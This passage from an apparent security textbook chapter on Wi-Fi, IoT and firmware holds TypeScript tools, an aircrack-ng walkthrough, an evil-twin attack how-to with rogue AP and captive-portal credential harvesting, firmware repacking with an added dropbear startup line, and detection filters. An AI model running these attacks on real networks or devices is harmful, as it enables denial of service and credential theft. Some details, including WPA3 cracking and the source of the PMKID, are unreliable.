    const capturedPmkid = await getInput('Captured PMKID (hex): ');

    rl.close();

    const cracker = new PmkidCracker();
    const pmk = cracker.derivePmk(ssid, password);
    const computedPmkid = cracker.computePmkid(
        pmk,
        Buffer.from(bssid.replace(/:/g, ''), 'hex'),
        Buffer.from(staMac.replace(/:/g, ''), 'hex')
    );

    console.log(`\nVerifying password: '${password}'`);
    console.log(`SSID: ${ssid}`);
    console.log(`Captured PMKID:  ${capturedPmkid}`);
    console.log(`Computed PMKID:  ${computedPmkid}`);

    if (computedPmkid === capturedPmkid) {
        console.log('\n✓ PASSWORD MATCHES!');
    } else {
        console.log('\n✗ Password does not match.');
    }
}
```

### 9.2 CRC / Modbus Checksum Calculator for Protocol Fuzzing

```typescript
// CRC-16 Modbus: polynomial 0x8005, initial 0xFFFF, final XOR 0x0000
// Used in Modbus RTU, Zigbee, and many IoT protocols for frame integrity

class CrcCalculator {
    private static readonly MODBUS_TABLE = CrcCalculator.generateModbusTable();
    private static readonly CRC8_TABLE = CrcCalculator.generateCrc8Table();

    private static generateModbusTable(): Uint16Array {
        const table = new Uint16Array(256);
        for (let i = 0; i < 256; i++) {
            let crc = i;
            for (let j = 0; j < 8; j++) {
                crc = (crc & 1) !== 0
                    ? (0xA001 ^ (crc >>> 1))
                    : (crc >>> 1);
            }
            table[i] = crc & 0xFFFF;
        }
        return table;
    }

    private static generateCrc8Table(): Uint8Array {
        const table = new Uint8Array(256);
        for (let i = 0; i < 256; i++) {
            let crc = i;
            for (let j = 0; j < 8; j++) {
                crc = (crc & 0x80) !== 0
                    ? (0x07 ^ (crc << 1))
                    : (crc << 1);
            }
            table[i] = crc & 0xFF;
        }
        return table;
    }

    static crc16Modbus(data: Buffer): number {
        let crc = 0xFFFF;
        for (const byte of data) {
            crc = (crc >>> 8) ^ this.MODBUS_TABLE[(crc ^ byte) & 0xFF];
        }
        return crc ^ 0x0000;
    }

    static crc8Dallas(data: Buffer): number {
        let crc = 0x00;
        for (const byte of data) {
            crc = this.CRC8_TABLE[crc ^ byte];
        }
        return crc;
    }

    static crc32(data: Buffer): number {
        let crc = 0xFFFFFFFF;
        const table = new Uint32Array(256);
        for (let i = 0; i < 256; i++) {
            let entry = i;
            for (let j = 0; j < 8; j++) {
                entry = (entry & 1) !== 0
                    ? (0xEDB88320 ^ (entry >>> 1))
                    : (entry >>> 1);
            }
            table[i] = entry;
        }

        for (const byte of data) {
            crc = table[(crc ^ byte) & 0xFF] ^ (crc >>> 8);
        }
        return (crc ^ 0xFFFFFFFF) >>> 0;
    }

    // Fuzz a protocol frame by calculating the correct CRC
    static fixModbusFrame(frame: Buffer): Buffer {
        // Modbus RTU frame: [address (1)] [function (1)] [data (n)] [CRC L] [CRC H]
        if (frame.length < 4) {
            throw new Error('Frame too short for Modbus RTU');
        }
        const dataPortion = frame.subarray(0, frame.length - 2);
        const crc = this.crc16Modbus(dataPortion);
        const result = Buffer.from(frame);
        result[frame.length - 2] = crc & 0xFF;        // CRC Low
        result[frame.length - 1] = (crc >>> 8) & 0xFF; // CRC High
        return result;
    }

    // Validate a Modbus frame
    static validateModbusFrame(frame: Buffer): boolean {
        if (frame.length < 4) return false;
        const expectedCrc = this.crc16Modbus(frame.subarray(0, frame.length - 2));
        const actualCrc = frame.readUInt16LE(frame.length - 2);
        return expectedCrc === actualCrc;
    }
}

// Fuzzer: generate malformed Modbus frames with corrected CRCs
class ModbusProtocolFuzzer {
    private static readonly FUNCTION_CODES = [1, 2, 3, 4, 5, 6, 15, 16, 22, 23];

    *generateFuzzFrames(): Generator<Buffer> {
        // Fuzz function code 3 (Read Holding Registers)
        for (const func of this.FUNCTION_CODES) {
            // Normal range
            yield CrcCalculator.fixModbusFrame(Buffer.from([
                0x01, func, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00
            ]));

            // Boundary values
            yield CrcCalculator.fixModbusFrame(Buffer.from([
                0x01, func, 0xFF, 0xFF, 0x00, 0x01, 0x00, 0x00
            ]));

            // Overflow quantities
            yield CrcCalculator.fixModbusFrame(Buffer.from([
                0x01, func, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00
            ]));
        }

        // Broadcast to address 0
        yield CrcCalculator.fixModbusFrame(Buffer.from([
            0x00, 0x05, 0x00, 0x01, 0xFF, 0x00, 0x00, 0x00
        ]));

        // Invalid address range (0xF0-0xFF reserved)
        for (let addr = 0xF0; addr <= 0xFF; addr++) {
            yield CrcCalculator.fixModbusFrame(Buffer.from([
                addr, 0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00
            ]));
        }

        // Oversized data payload (buffer overflow test)
        const oversized = Buffer.alloc(260);
        oversized[0] = 0x01; // address
        oversized[1] = 0x10; // write multiple registers
        oversized[2] = 0x00; oversized[3] = 0x01; // starting address
        oversized[4] = 0x00; oversized[5] = 0x7D; // 125 registers
        oversized[6] = 0xFA; // byte count = 250 (valid max should be 250)
        // Fill data with random values
        for (let i = 7; i < oversized.length - 2; i++) {
            oversized[i] = Math.floor(Math.random() * 256);
        }
        yield CrcCalculator.fixModbusFrame(oversized);
    }

    // Try all function codes with malformed payloads
    *fuzzAll(): Generator<Buffer> {
        for (const frame of this.generateFuzzFrames()) {
            yield frame;
        }
    }
}

// Usage
const fuzzer = new ModbusProtocolFuzzer();
console.log('=== Modbus Protocol Fuzzer ===');
let count = 0;
for (const frame of fuzzer.fuzzAll()) {
    const valid = CrcCalculator.validateModbusFrame(frame);
    console.log(
        `Frame ${++count}: ${frame.toString('hex')} ` +
        `(CRC: ${valid ? 'valid' : 'INVALID'})`
    );
    if (count >= 20) {
        console.log('... (truncated)');
        break;
    }
}
```

### 9.3 Wi-Fi Deauthentication Detector

```typescript
import * as os from 'os';

interface DeauthFrame {
    timestamp: number;
    sourceMac: string;
    destinationMac: string;
    bssid: string;
    reasonCode: number;
    isSpoofed: boolean;
}

interface DeauthAlert {
    severity: 'low' | 'medium' | 'high' | 'critical';
    message: string;
    sourceMac?: string;
    rateCount: number; // deauths per second
}

class DeauthDetector {
    private deauthHistory: DeauthFrame[] = [];
    private readonly WINDOW_MS = 60000; // 1-minute sliding window
    private readonly LOW_THRESHOLD = 5;     // deauths/min
    private readonly MEDIUM_THRESHOLD = 20;
    private readonly HIGH_THRESHOLD = 100;
    private readonly SPOOF_THRESHOLD = 3;   // consecutive deauths with different source MACs

    // Parse a deauthentication frame from raw 802.11 bytes
    parseDeauthFrame(rawFrame: Buffer): DeauthFrame | null {
        // IEEE 802.11 deauth frame format:
        // - Frame Control (2 bytes): type=0x00, subtype=0xC (deauth)
        // - Duration (2 bytes)
        // - Address 1 - Destination (6 bytes)
        // - Address 2 - Source (6 bytes)
        // - Address 3 - BSSID (6 bytes)
        // - Sequence Control (2 bytes)
        // - Reason Code (2 bytes)
        // - FCS (4 bytes)

        if (rawFrame.length < 24) return null;

        const frameControl = rawFrame.readUInt16LE(0);
        const type = (frameControl >> 2) & 0x03;
        const subtype = (frameControl >> 4) & 0x0F;

        // Management frame (type=0) with deauth subtype (subtype=0xC)
        if (type !== 0x00 || subtype !== 0x0C) return null;

        const destMac = rawFrame.subarray(4, 10).toString('hex')
            .replace(/(.{2})/g, '$1:').slice(0, -1);
        const srcMac = rawFrame.subarray(10, 16).toString('hex')
            .replace(/(.{2})/g, '$1:').slice(0, -1);
        const bssid = rawFrame.subarray(16, 22).toString('hex')
            .replace(/(.{2})/g, '$1:').slice(0, -1);
        const reasonCode = rawFrame.readUInt16LE(24);

        return {
            timestamp: Date.now(),
            sourceMac: srcMac,
            destinationMac: destMac,
            bssid,
            reasonCode,
            isSpoofed: false, // determined later
        };
    }

    // Process a captured frame and detect attacks
    processFrame(rawFrame: Buffer): DeauthAlert | null {
        const frame = this.parseDeauthFrame(rawFrame);
        if (!frame) return null;

        this.deauthHistory.push(frame);
        this.pruneHistory();

        // Deauth rate calculation
        const recentDeauths = this.deauthHistory.filter(
            f => Date.now() - f.timestamp < this.WINDOW_MS
        );

        if (recentDeauths.length < 2) return null;

        const ratePerSec = Math.round(
            recentDeauths.length / (this.WINDOW_MS / 1000)
        );

        // Detect spoofed deauths by tracking source MAC diversity
        const uniqueSources = new Set(recentDeauths.map(f => f.sourceMac));
        const sourceCount = uniqueSources.size;

        // Detect deauth flood (DoS attack)
        if (ratePerSec > this.HIGH_THRESHOLD || recentDeauths.length > this.HIGH_THRESHOLD) {
            return {
                severity: 'critical',
                message: `Massive deauth flood detected! ${recentDeauths.length} packets in 60s (${ratePerSec}/sec)`,
                sourceMac: frame.bssid,
                rateCount: ratePerSec,
            };
        }

        if (ratePerSec > this.MEDIUM_THRESHOLD) {
            return {
                severity: 'high',
                message: `Sustained deauth attack: ${recentDeauths.length} packets, ${ratePerSec}/sec`,
                rateCount: ratePerSec,
            };
        }

        // Detect spoofed deauths (MAC spoofing)
        if (sourceCount > this.SPOOF_THRESHOLD && recentDeauths.length > this.LOW_THRESHOLD) {
            return {
                severity: 'high',
                message: `Possible spoofed deauth: ${sourceCount} different source MACs targeting ${frame.bssid}`,
                sourceMac: frame.bssid,
                rateCount: ratePerSec,
            };
        }

        // Low-rate or single deauth (could be legitimate)
        if (ratePerSec > this.LOW_THRESHOLD) {
            return {
                severity: 'medium',
                message: `Elevated deauth rate: ${recentDeauths.length} packets/min from ${sourceCount} sources`,
                rateCount: ratePerSec,
            };
        }

        return null;
    }

    private pruneHistory(): void {
        const cutoff = Date.now() - this.WINDOW_MS;
        this.deauthHistory = this.deauthHistory.filter(
            f => f.timestamp >= cutoff
        );
    }

    getStats(): object {
        const byBssid = new Map<string, number>();
        for (const f of this.deauthHistory) {
            byBssid.set(f.bssid, (byBssid.get(f.bssid) || 0) + 1);
        }

        return {
            totalTracked: this.deauthHistory.length,
            uniqueTargets: byBssid.size,
            topTargets: [...byBssid.entries()]
                .sort((a, b) => b[1] - a[1])
                .slice(0, 5),
        };
    }
}

// Simulate processing captured frames
function simulateCapture(): Buffer {
    // Generate a realistic deauth frame
    const frame = Buffer.alloc(26);
    // Frame control: type=0x00 (management), subtype=0x0C (deauth)
    frame.writeUInt16LE(0x00C0, 0); // bit 2-3: type=0, bit 4-7: subtype=0xC
    // Duration: 0
    frame.writeUInt16LE(0x0000, 2);
    // Destination MAC (broadcast)
    const destMac = Buffer.from([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
    destMac.copy(frame, 4);
    // Source MAC (spoofed)
    const srcMac = Buffer.from([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
    srcMac.copy(frame, 10);
    // BSSID
    const bssid = Buffer.from([0x00, 0x11, 0x22, 0x33, 0x44, 0x55]);
    bssid.copy(frame, 16);
    // Sequence control
    frame.writeUInt16LE(0x0000, 22);
    // Reason code: 0x07 = Class 3 frame received from nonassociated STA
    frame.writeUInt16LE(0x0007, 24);

    return frame;
}

// Demo
const detector = new DeauthDetector();
console.log('=== Deauthentication Attack Detector ===\n');

for (let i = 0; i < 30; i++) {
    const frame = simulateCapture();
    const alert = detector.processFrame(frame);
    if (alert) {
        console.log(
            `[${alert.severity.toUpperCase()}] ${alert.message} ` +
            `(rate: ${alert.rateCount}/sec)`
        );
    }
}

console.log('\n--- Detector Stats ---');
console.log(detector.getStats());
```

---

## 10. Aircrack-ng Full Walkthrough

### 10.1 Environment Setup

```bash
# Install aircrack-ng suite
sudo apt-get install aircrack-ng  # Debian/Ubuntu
sudo pacman -S aircrack-ng         # Arch

# Verify wireless card supports monitor mode
iw list | grep -A 10 "Supported interface modes"
# Look for: "* monitor"

# Enable monitor mode
sudo airmon-ng start wlan0
# Note the new interface name (e.g., wlan0mon)
```

### 10.2 Reconnaissance

```bash
# Scan for surrounding APs and clients
sudo airodump-ng wlan0mon

# Focus on a specific channel and BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

**Key output columns:**
```
BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  120      32     6   130  WPA2 CCMP   PSK   HomeNetwork
```

- **PWR** — signal strength (higher is closer)
- **#Data** — number of data packets (indicates activity)
- **CH** — channel
- **ENC** — WEP, WPA, WPA2, or WPA3
- **CIPHER** — TKIP, CCMP, GCMP
- **AUTH** — PSK (personal) or MGT (enterprise)

### 10.3 Handshake Capture

```bash
# Wait for a client to authenticate, or force it:

# Method 1: Deauthentication attack
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -0 = deauth count, -a = AP MAC, -c = client MAC (omit for broadcast)

# Method 2: Authentication flood (for WEP)
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# Monitor for "WPA handshake" message in airodump-ng output
# The handshake .cap file is saved as capture-01.cap
```

### 10.4 Cracking the Handshake

```bash
# Option A: Using aircrack-ng with a wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Option B: PMKID attack (faster — no client needed)
# First, extract PMKID from beacon (use hcxpcapngtool)
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Option C: Using hashcat with GPU acceleration
# Convert .cap to hashcat format
cap2hccapx capture-01.cap capture.hccapx
hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt --force

# Option D: WPA3 SAE cracking
hcxpcapngtool -o hash.hc22000 capture-wpa3.cap
hashcat -m 22000 hash.hc22000 wordlist.txt -w 3
```

### 10.5 Interpreting Results

```
                                           Aircrack-ng 1.7

                   [00:00:01] 6 tests done (142.96 k/s)

  KEY FOUND! [ hunter2 ]

  Master Key     : 1A 2B 3C 4D 5E 6F 78 90 12 34 56 78 9A BC DE F0
  Transient Key  : ...
  EAPOL HMAC     : ...
```

### 10.6 PMKID Attack (Alternative)

```bash
# Check if AP exposes PMKID
# PMKID is in the first EAPOL frame of the 4-way handshake
# If hcxpcapngtool shows hash mode 22000, you have PMKID

# Capture with PMKID focus
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w pmkid_capture wlan0mon

# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 pmkid_capture-01.cap

# Crack with hashcat
hashcat -m 22000 hash.hc22000 wordlist.txt
```

---

## 11. Evil Twin Attack How-To

### 11.1 Theory

An evil twin is a rogue access point that impersonates a legitimate Wi-Fi network. The victim's device connects to the rogue AP because it has higher signal strength or the same SSID. The attacker can then:
- Capture the victim's handshake (passive)
- Present a captive portal to harvest credentials (active MITM)
- Perform SSL stripping or DNS poisoning after the victim connects

### 11.2 Execution Steps

```bash
# Phase 1: Identify target network
sudo airodump-ng wlan0mon
# Note: BSSID, CH, ESSID of target

# Phase 2: Deauthenticate all clients from legitimate AP
# Run in a separate terminal
sudo aireplay-ng -0 0 -a <TARGET_BSSID> wlan0mon
# The -0 0 means continuous deauth (infinite)

# Phase 3: Set up the rogue AP
# Create a virtual interface
sudo iw dev wlan0mon interface add rogue type managed

# Configure the rogue AP with the same SSID as target
sudo ip link set rogue up
sudo ip addr add 192.168.1.1/24 dev rogue

# Install and configure hostapd for the rogue AP
cat > /tmp/hostapd-evil.conf << 'EOF'
interface=rogue
driver=nl80211
ssid=<TARGET_ESSID>
hw_mode=g
channel=<TARGET_CH>
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=anything123  # Doesn't matter — we're after the handshake
EOF

sudo hostapd /tmp/hostapd-evil.conf -B

# Phase 4: Set up DHCP and DNS
sudo dnsmasq --interface=rogue --dhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,1h \
             --dhcp-option=3,192.168.1.1 --dhcp-option=6,192.168.1.1 -d &

# Phase 5: Capture the handshake when clients try to connect
sudo airodump-ng -c <TARGET_CH> --bssid <ROGUE_MAC> -w evil_capture wlan0mon

# Phase 6: (Optional) Captive portal with credentials harvesting
# Use a tool like fluxion or manually set up:
# iptables -t nat -A PREROUTING -i rogue -p tcp --dport 80 -j REDIRECT --to-port 8080
# Then run a web server serving a fake router login page
```

### 11.3 Detecting Evil Twins

```typescript
interface AccessPoint {
    bssid: string;
    ssid: string;
    channel: number;
    signal: number;
    encryption: string;
    beaconInterval: number;
    supportedRates: number[];
    country?: string;
    fingerprint: string; // Unique identifying features
}

class EvilTwinDetector {
    detect(legitimateAps: AccessPoint[], observedAps: AccessPoint[]): AccessPoint[] {
        const suspicious: AccessPoint[] = [];

        for (const observed of observedAps) {
            const matches = legitimateAps.filter(
                ap => ap.ssid === observed.ssid
            );

            if (matches.length === 0) continue;

            // Check for discrepancies
            for (const legit of matches) {
                const issues: string[] = [];

                // Different BSSID with same SSID
                if (observed.bssid !== legit.bssid) {
                    issues.push('Different BSSID');
                }

                // Different channel
                if (observed.channel !== legit.channel) {
                    issues.push(`Different channel (${observed.channel} vs ${legit.channel})`);
                }

                // Different encryption
                if (observed.encryption !== legit.encryption) {
                    issues.push(`Different encryption (${observed.encryption} vs ${legit.encryption})`);
                }

                // Signal strength anomaly (evil twin often closer)
                if (observed.signal > legit.signal + 15) {
                    issues.push('Suspiciously strong signal');
                }

                // Beacon interval deviation
                if (Math.abs(observed.beaconInterval - legit.beaconInterval) > 20) {
                    issues.push('Unusual beacon interval');
                }

                // Supported rates check
                const ratesMatch = observed.supportedRates.length === legit.supportedRates.length &&
                    observed.supportedRates.every((r, i) => r === legit.supportedRates[i]);
                if (!ratesMatch) {
                    issues.push('Different supported rates');
                }

                if (issues.length > 0) {
                    suspicious.push(observed);
                    console.log(`[!] Evil twin candidate: ${observed.ssid} (${observed.bssid})`);
                    issues.forEach(i => console.log(`    - ${i}`));
                }
            }
        }

        return suspicious;
    }
}
```

---

## 12. Firmware Analysis Lab with Binwalk

### 12.1 Lab Setup

```bash
# Install binwalk and dependencies
sudo apt-get install binwalk  # Or build from source
pip install matplotlib        # For entropy graphs

# Install extraction helpers
sudo apt-get install ubi-reader mtd-utils
sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev
```

### 12.2 Lab Exercise: TP-Link Router Firmware

```bash
# Step 1: Download firmware
wget https://static.tp-link.com/archer-c7-v5-en-us-update-2023.zip
unzip archer-c7-v5-en-us-update-2023.zip
ls *.bin
# Output: ArcherC7v5_en-us_2023.bin

# Step 2: Initial analysis
binwalk ArcherC7v5_en-us_2023.bin

# Step 3: Entropy analysis
binwalk -E ArcherC7v5_en-us_2023.bin
# Look for regions with low entropy (plaintext) vs high entropy (compressed/encrypted)

# Step 4: Extract filesystem
binwalk -e ArcherC7v5_en-us_2023.bin
ls _ArcherC7v5_en-us_2023.bin.extracted/
# Typical output: squashfs-root/  lzma-*  uboot-*

# Step 5: Explore the filesystem
cd _ArcherC7v5_en-us_2023.bin.extracted/squashfs-root/
ls -la
# Common directories: bin/, sbin/, usr/, etc/, lib/, webroot/, www/

# Step 6: Find hardcoded credentials
grep -r "password" etc/ --include="*.cfg" --include="*.conf" --include="*.xml"
grep -r "admin" etc/shadow* 2>/dev/null
strings ../* | grep -i "password\|username\|secret" | head -20

# Step 7: Extract UPnP binaries
strings bin/upnpd | grep -i "curl\|wget\|tftp\|telnet" | head -10

# Step 8: Check SSL certificates
find . -name "*.pem" -o -name "*.crt" -o -name "*.cert"
openssl x509 -in etc/ssl/certs/ca-cert.pem -text -noout

# Step 9: Analyze web interface
find . -name "*.htm" -o -name "*.html" -o -name "*.asp" -o -name "*.php"
grep -r "exec\|system\|popen\|eval\|passthru" www/ --include="*.php"

# Step 10: Look for backdoor endpoints
grep -r "debug\|shell\|cmd\|exec\|backdoor\|test" www/ --include="*.htm" --include="*.js"
```

### 12.3 Interpreting Results

```bash
# Typical findings report:

# 1. Squashfs filesystem detected at offset 0x40000
# 2. Hardcoded credentials:
#    - etc/shadow: root:$1$ABC123$xyz...: admin
#    - etc/config/wireless: option key '12345678'
# 3. U-Boot bootloader at offset 0x0
# 4. LZMA compressed kernel at 0x20000
# 5. Web server: lighttpd with default config
# 6. SSL certificate with SHA1 fingerprint (weak)
# 7. BusyBox 1.25.1 with telnet enabled
# 8. Backdoor: /cgi-bin/debug.cgi accepts ?cmd= parameter
```

### 12.4 Manual Firmware Modification & Repacking

```bash
# Step 1: Modify a configuration file
cd _extracted/squashfs-root/
echo "dropbear -E -d /etc/dropbear/dropbear_rsa_host_key" >> etc/init.d/rcS

# Step 2: Repack the filesystem
mksquashfs squashfs-root/ newroot.squashfs -comp xz

# Step 3: Rebuild firmware image
dd if=/dev/zero bs=1024 count=4096 > padded.bin
dd if=original_uboot.bin of=padded.bin conv=notrunc
dd if=newroot.squashfs of=padded.bin bs=1024 seek=256 conv=notrunc

# Step 4: Sign the firmware (if signed, need key extraction first)
# Many routers use RSA-1024 or RSA-2048 signatures
# Check for .sig files in original firmware or extract from bootloader
```

---

## 13. Wireshark Wi-Fi Filter Cheat Sheet

### 13.1 Basic Capture Filters

| Filter | Description |
|---|---|
| `wlan.fc.type_subtype == 0x08` | Beacon frames |
| `wlan.fc.type_subtype == 0x05` | Probe Response |
| `wlan.fc.type_subtype == 0x0a` | Disassociation |
| `wlan.fc.type_subtype == 0x0c` | **Deauthentication** |
| `wlan.fc.type_subtype == 0x0b` | Authentication |
| `wlan.fc.type_subtype == 0x00` | Association Request |
| `wlan.fc.type_subtype == 0x01` | Association Response |
| `wlan.fc.type_subtype == 0x1d` | Null function (power save) |

### 13.2 EAPOL / 4-Way Handshake Filters

| Filter | Description |
|---|---|
| `eapol` | All EAPOL frames |
| `eapol.type == 3 && eapol.descriptor.type == 2` | WPA2 4-way handshake frames |
| `eapol.type == 3 && eapol.key.key_info & 0x0008` | EAPOL-Key (contains ANonce or SNonce) |
| `eapol.type == 3 && eapol.key.key_info & 0x0010` | EAPOL-Key (contains MIC) |
| `eapol.type == 3 && eapol.key.key_info & 0x0080` | EAPOL-Key (contains encrypted GTK) |
| `eapol.type == 3 && eapol.key.key_info & 0x0200` | EAPOL-Key (PMKID present) |

### 13.3 Authentication Type Filters

| Filter | Description |
|---|---|
| `wlan.rsn.akm.type == 2` | WPA2-Personal (PSK) |
| `wlan.rsn.akm.type == 1` | WPA2-Enterprise (802.1X) |
| `wlan.rsn.akm.type == 6` | WPA3-SAE |
| `wlan.rsn.akm.type == 8` | WPA3-Enterprise Suite B |
| `wlan.tag == 48` | RSN Information Element (WPA2/WPA3) |
| `wlan.tag == 221` | Vendor-specific IE (often WPA) |

### 13.4 Attack Detection Filters

| Filter | Description |
|---|---|
| `(wlan.fc.type_subtype == 0x0c) && (wlan.addr1 == ff:ff:ff:ff:ff:ff)` | Broadcast deauth (DoS attack) |
| `(wlan.fc.type_subtype == 0x0c) && !(wlan.fc.ds)` | Deauth with invalid FromDS/ToDS bits |
| `eapol && wlan.fc.retry == 1` | Retransmitted EAPOL (possible KRACK) |
| `(wlan.fc.type_subtype == 0x05) && (wlan.probe_resp.ds.parameter_set.current_channel != wlan.ds.parameter_set.current_channel)` | Probe Response on wrong channel (evil twin) |
| `(wlan.fc.type_subtype == 0x08) && (wlan.beacon.ds.parameter_set.current_channel != 0)` | Beacons with DS params (check channel consistency) |

### 13.5 BLE / Zigbee / Wireless IoT Filters

| Filter | Description |
|---|---|
| `btle` | Bluetooth Low Energy frames |
| `btle.advertising_address` | Filter by BLE MAC address |
| `btatt` | BLE ATT protocol (read/write characteristics) |
| `btl2cap` | BLE L2CAP layer |
| `zbee_zcl` | Zigbee Cluster Library |
| `zbee_aps` | Zigbee APS layer (security headers) |
| `wpan` | IEEE 802.15.4 (Zigbee/Thread base) |
| `zwave` | Z-Wave frames |

### 13.6 Advanced Display Filter Macros

```bash
# Display Filter Macros (Edit → Preferences → Display Filters → +)

# Name: wpa2_4way
# Expression: eapol && wlan.bssid == AA:BB:CC:DD:EE:FF

# Name: deauth_flood
# Expression: (wlan.fc.type_subtype == 0x0c) && (frame.time_delta < 0.01)

# Name: probe_req_ssid
# Expression: wlan.fc.type_subtype == 0x04 && wlan.tag == 0

# Name: hidden_ssid
# Expression: (wlan.fc.type_subtype == 0x08) && (wlan.tag.length == 0)
```

---

## Practical Takeaways

| Takeaway | Application |
|----------|-------------|
| Always audit WPA2 handshakes for PMKID attacks | Capture the first EAPOL frame and compute PMKID offline — no client required, works even without a full 4-way handshake |
| Use 802.1X/EAP with certificate validation for enterprise Wi-Fi | WPA2-PSK is vulnerable to cracking; migrate to WPA3-Enterprise or at minimum validate RADIUS server certificates |
| Treat BLE advertisements as untrusted | BLE broadcasts are cleartext and spoofable — never transmit credentials or sensitive data in advertisement payloads |
| Always change Zigbee default link keys | The default `ZigBeeAlliance09` key is public; always set a unique network key and use touchlink commissioning with QR code enrollment |
| Run entropy analysis on every firmware sample | Binwalk entropy scan reveals encrypted/compressed regions in seconds — low entropy = plaintext, high entropy = packed/ciphered |
| Never expose MQTT without TLS + authentication | MQTT on port 1883 with anonymous access allows anyone to subscribe to `#`; enforce TLS on 8883 and require client certificates |
| Audit IoT device UART/JTAG exposure | Check for accessible UART (TX/RX/GND) and JTAG (TMS/TCK/TDI/TDO) on exposed PCB headers — these dump firmware without authentication |

## Summary

Wireless, IoT, and embedded security is a multi-dimensional discipline that spans radio-layer attacks, protocol-level vulnerabilities, firmware reverse engineering, and hardware-level exploitation.

**Key takeaways:**

1. **Wi-Fi security has evolved through four generations**: WEP (trivially broken → IV collisions), WPA (broken → Beck-Tews attack), WPA2 (weakened → KRACK, PMKID), WPA3 (improved but flawed → Dragonblood side-channels). Enterprise Wi-Fi using 802.1X/EAP remains the strongest option but is susceptible to rogue APs and certificate validation issues.

2. **Bluetooth/BLE vulnerabilities affect billions**: BlueBorne enables RCE without pairing; BLUFFS breaks forward secrecy; BLE advertisements are broadcast in cleartext, enabling tracking and spoofing. The Security Manager Protocol (SMP) provides levels 0–4, with Legacy Pairing (Level 3) offering no MITM protection.

3. **Zigbee and Z-Wave use mesh topologies**: The AES-CCM* cipher at their core is strong, but key management is the weak link — network keys transmitted during join (`ZigBeeAlliance09`), keys extracted from flash, and replay attacks (frame counter resets) are all demonstrated attack vectors.

4. **RFID/NFC systems rely on broken ciphers**: Mifare Classic's Crypto-1 is fully reversed with practical attacks (nested auth, mfoc). Chameleon Mini can clone most HF smart cards. HID iClass uses a proprietary 64-bit cipher vulnerable to SAM cloning and brute-force.

5. **IoT protocols lack basic security**: MQTT commonly ships with no authentication, no TLS, and anonymous access enabling global topic subscription (`#`). CoAP's NoSec mode and amplification attack potential create DDoS risks. Matter and Thread represent improvements but implementation weaknesses persist.

6. **Firmware analysis uncovers severe vulnerabilities**: Binwalk extracts filesystems, entropy analysis identifies encrypted/compressed regions, and string scanning reveals hardcoded credentials, backdoor endpoints, and private keys. Over 60% of IoT firmware analyzed in public studies contains at least one hardcoded credential.

7. **Embedded hardware has accessible debug interfaces**: UART
    console access, SPI flash dumping, JTAG debugging, and side-channel attacks (DPA, glitching) are practical with low-cost tools ($10–$1000). Physical access to a device virtually guarantees compromise.

8. **The IoT attack surface continues to expand**: With an estimated 30+ billion connected devices, each representing a potential entry point, security must be layered across radio, protocol, firmware, and hardware domains. The combination of TypeScript security tooling demonstrated in this chapter — PMKID verification, BLE spoofing detection, MQTT auditing, entropy analysis, CRC fuzzing, and deauth detection — provides a programmatic foundation for automated security assessment.

```mermaid
flowchart TB
    subgraph "IoT Attack Surface"
        RADIO["Radio Layer<br/>Sniffing, Jamming,<br/>Replay"]
        PROTO["Protocol Layer<br/>Weak Crypto, No Auth,<br/>Cleartext"]
        FIRM["Firmware Layer<br/>Hardcoded Creds,<br/>Backdoors"]
        HARD["Hardware Layer<br/>JTAG, UART, Flash,<br/>Side-channel"]
    end
    
    RADIO -->|Gain access to| PROTO
    PROTO -->|Extract from| FIRM
    FIRM -->|Flash dump via| HARD
    
    ATTACK["Attacker Goals:<br/>- Credential theft<br/>- Persistent access<br/>- Lateral movement<br/>- Data exfiltration<br/>- Botnet inclusion"]
    
    HARD --> ATTACK
    RADIO --> ATTACK
    
    style ATTACK fill:#e94560,stroke:#1a1a2e,color:#fff
    style RADIO fill:#1a1a2e,stroke:#e94560,color:#fff
    style PROTO fill:#0f3460,stroke:#16c79a,color:#fff
    style FIRM fill:#533483,stroke:#e94560,color:#fff
    style HARD fill:#16213e,stroke:#0f3460,color:#fff
```

---

## Chapter Quiz

| # | Question | A | B | C | D | Answer |
|---|----------|---|---|---|---|--------|
| 1 | What is the primary cryptographic weakness exploited in the PMKID attack against WPA2? | Weak RC4 implementation in TKIP | Inclusion of PMKID in the first EAPOL frame, enabling offline brute-force | Predictable random number generation in 802.11 beacons | Absence of MIC verification in EAPOL-Key frames | **B** |
| 2 | Which Bluetooth vulnerability allows remote code execution without prior pairing or user interaction? | BLUFFS | BlueBorne | KNOB | SweynTooth | **B** |
| 3 | In Zigbee security, which key is shared across all devices in a Personal Area Network (PAN)? | Master Key | Link Key | Network Key | Session Key | **C** |
| 4 | What is the effective entropy (in bits) of a WPS PIN when brute-forcing with the half-key vulnerability? | 8 bits | 10,000 + 1,000 possibilities (~13.4 bits) | 10^8 possibilities (~26.6 bits) | 10^4 possibilities (~13.3 bits) | **B** |
| 5 | Which of the following is NOT a valid defense against Evil Twin attacks? | Validating RADIUS server certificates in 802.1X | Using WPA3-SAE with SAE hash-to-element | Increasing beacon interval to 500ms | Cross-checking BSSID vs. physical location history | **C** |
| 6 | What does `Binwalk -E firmware.bin` do during firmware analysis? | Extracts the encrypted filesystem using AES-256 | Generates an entropy graph to identify compressed/encrypted regions | Emulates the firmware in a virtual environment | Extracts all embedded file signatures | **B** |
